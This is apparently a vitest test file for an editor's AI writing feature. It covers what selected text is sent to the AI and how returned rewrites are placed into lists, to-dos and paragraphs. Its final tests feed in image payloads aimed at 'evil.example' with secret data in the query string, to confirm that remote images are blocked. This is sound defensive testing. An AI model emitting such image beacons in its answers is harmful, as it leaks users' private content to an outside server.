import { getSchema, type JSONContent } from '@tiptap/core'
import Image from '@tiptap/extension-image'
import { TaskItem, TaskList } from '@tiptap/extension-list'
import type { Node as PMNode } from '@tiptap/pm/model'
import { EditorState } from '@tiptap/pm/state'
import StarterKit from '@tiptap/starter-kit'
import { describe, expect, it } from 'vitest'
import { markdownToDoc } from '../lib/markdown/parse'
import { docToMarkdown } from '../lib/markdown/serialize'
import { parseAnswer, placeAnswer, selectedBlocks } from './aiPlace'
import { tableExtensions } from './extensions/table'

const schema = getSchema([StarterKit, TaskList, TaskItem.configure({ nested: true }), Image.configure({ inline: false, allowBase64: true }), ...tableExtensions])
const parse = (md: string) => schema.nodeFromJSON(markdownToDoc(md))
const md = (doc: PMNode) => docToMarkdown(doc.toJSON() as JSONContent).trim()

/** The position just before (or, with `after`, just after) the first `text` in the doc. */
function at(doc: PMNode, text: string, after = false): number {
  let found = -1
  doc.descendants((n, pos) => {
    if (found >= 0 || !n.isText) return found < 0
    const i = n.text!.indexOf(text)
    if (i >= 0) found = pos + i + (after ? text.length : 0)
    return false
  })
  if (found < 0) throw new Error(`"${text}" not in doc`)
  return found
}

const sent = (doc: PMNode, from: number, to: number) => {
  const { content } = selectedBlocks(doc, from, to)
  const json = content.toJSON() as JSONContent[]
  const blocks = json.every((n) => schema.nodes[n.type!]?.isBlock) ? json : [{ type: 'paragraph', content: json }]
  return docToMarkdown({ type: 'doc', content: blocks }).trim()
}

function place(page: string, answer: string, from: number, to: number, replace: boolean) {
  const doc = parse(page)
  const tr = EditorState.create({ doc }).tr
  const range = placeAnswer(tr, parseAnswer(schema, answer), from, to, replace)
  return { out: md(tr.doc), landed: tr.doc.textBetween(range.from, range.to, '|') }
}

describe('what the AI is sent', () => {
  const doc = parse('Intro\n\n- teh one\n- teh two\n- teh three\n\nOutro')

  it('keeps the bullets when the selection spans list items', () => {
    expect(sent(doc, at(doc, 'teh one'), at(doc, 'teh three', true))).toBe('- teh one\n- teh two\n- teh three')
  })

  it('keeps to-do boxes and their ticks', () => {
    const tasks = parse('- [ ] buy milk\n- [x] call mum')
    expect(sent(tasks, at(tasks, 'buy'), at(tasks, 'mum', true))).toBe('- [ ] buy milk\n- [x] call mum')
  })

  it('is just the words for a selection inside one line, even in a heading or a bullet', () => {
    const page = parse('# A big title\n\n- teh one')
    expect(sent(page, at(page, 'big'), at(page, 'title', true))).toBe('big title')
    expect(sent(page, at(page, 'teh'), at(page, 'one', true))).toBe('teh one')
  })

  it('sends a paragraph and the list after it as they are', () => {
    expect(sent(doc, at(doc, 'Intro'), at(doc, 'teh two', true))).toBe('Intro\n\n- teh one\n- teh two')
  })
})

describe('rewriting a selection', () => {
  const page = 'Intro\n\n- teh one\n- teh two\n- teh three\n\nOutro'

  it('gives back three bullets for three bullets', () => {
    const doc = parse(page)
    const { out } = place(page, '- the one\n- the two\n- the three', at(doc, 'teh one'), at(doc, 'teh three', true), true)
    expect(out).toBe('Intro\n\n- the one\n- the two\n- the three\n\nOutro')
  })

  it('keeps to-dos as to-dos, with their ticks', () => {
    const tasks = '- [ ] by milk\n- [x] cal mum\n- [ ] walk dog'
    const doc = parse(tasks)
    const { out } = place(tasks, '- [ ] buy milk\n- [x] call mum', at(doc, 'by'), at(doc, 'mum', true), true)
    expect(out).toBe('- [ ] buy milk\n- [x] call mum\n- [ ] walk dog')
  })

  it('rewrites part of the first and last bullets without splitting them', () => {
    const doc = parse(page)
    const { out } = place(page, '- one!\n- the two\n- the', at(doc, 'one'), at(doc, 'teh three', false) + 3, true)
    expect(out).toBe('Intro\n\n- teh one!\n- the two\n- the three\n\nOutro')
  })

  it('replaces paragraphs with paragraphs', () => {
    const doc = parse('One\n\nTwo\n\nThree')
    const { out, landed } = place('One\n\nTwo\n\nThree', 'Uno\n\nDos', at(doc, 'One'), at(doc, 'Two', true), true)
    expect(out).toBe('Uno\n\nDos\n\nThree')
    expect(landed).toBe('Uno|Dos')
  })

  it('swaps the words of one line in place', () => {
    const doc = parse('Hello wrold, bye')
    expect(place('Hello wrold, bye', 'world', at(doc, 'wrold'), at(doc, 'wrold', true), true).out).toBe('Hello world, bye')
  })
})

describe('continue writing', () => {
  it('carries on the line, with a space, then adds the next paragraph', () => {
    const page = 'I went to the store.'
    const doc = parse(page)
    const end = at(doc, 'store.', true)
    const { out, landed } = place(page, 'There I found bread.\n\nThen I went home.', end, end, false)
    expect(out).toBe('I went to the store. There I found bread.\n\nThen I went home.')
    expect(landed).toBe(' There I found bread.|Then I went home.')
  })

  it('adds list items as siblings of the current one, not nested under it', () => {
    const page = '- milk\n- eggs\n- jam'
    const doc = parse(page)
    const end = at(doc, 'eggs', true)
    const { out, landed } = place(page, '- bread\n- butter', end, end, false)
    expect(out).toBe('- milk\n- eggs\n- bread\n- butter\n- jam')
    expect(landed).toBe('bread|butter')
  })

  it('adds to-dos after the current to-do', () => {
    const page = '- [ ] milk'
    const doc = parse(page)
    const end = at(doc, 'milk', true)
    expect(place(page, '- [ ] eggs\n- [ ] jam', end, end, false).out).toBe('- [ ] milk\n- [ ] eggs\n- [ ] jam')
  })

  it('puts a list that follows a paragraph after it', () => {
    const page = 'Shopping:'
    const doc = parse(page)
    const end = at(doc, 'Shopping:', true)
    expect(place(page, '- bread\n- butter', end, end, false).out).toBe('Shopping:\n\n- bread\n- butter')
  })

  it('starts a heading on its own line', () => {
    const page = 'Intro text'
    const doc = parse(page)
    const end = at(doc, 'text', true)
    expect(place(page, '## Next\n\nMore', end, end, false).out).toBe('Intro text\n\n## Next\n\nMore')
  })

  it('still adds a single sentence to the line with a space', () => {
    const page = 'Hello'
    const doc = parse(page)
    const end = at(doc, 'Hello', true)
    expect(place(page, 'there.', end, end, false).out).toBe('Hello there.')
  })
})

describe('reading the answer', () => {
  const images = (doc: PMNode) => {
    const srcs: string[] = []
    doc.descendants((n) => {
      if (n.type.name === 'image') srcs.push(n.attrs.src as string)
    })
    return srcs
  }

  it('turns remote images into links, so nothing loads by itself', () => {
    const doc = parseAnswer(schema, 'Summary.\n\n![](https://evil.example/p?d=secret%20note)')
    expect(images(doc)).toEqual([])
    expect(md(doc)).toBe('Summary.\n\nhttps://evil.example/p?d=secret%20note')
  })

  it('keeps pasted pictures', () => {
    expect(images(parseAnswer(schema, '![a](data:image/png;base64,AAAA)'))).toEqual(['data:image/png;base64,AAAA'])
  })
})

describe('parseAnswer and remote images', () => {
  const images = (doc: PMNode) => {
    const srcs: string[] = []
    doc.descendants((n) => {
      if (n.type.name === 'image') srcs.push(String(n.attrs.src))
    })
    return srcs
  }
  it('never lets an answer load an image from another server', () => {
    for (const answer of ['![](https://evil.example/p?d=x)', '!![](https://evil.example/p?d=x)', 'x!![a](https://evil.example/p)', '<img src="https://evil.example/x.png">']) {
      expect(images(parseAnswer(schema, answer))).toEqual([])
    }
  })
  it('keeps pasted (data:) images', () => {
    expect(images(parseAnswer(schema, '![a](data:image/png;base64,AAAA)'))).toEqual(['data:image/png;base64,AAAA'])
  })
})
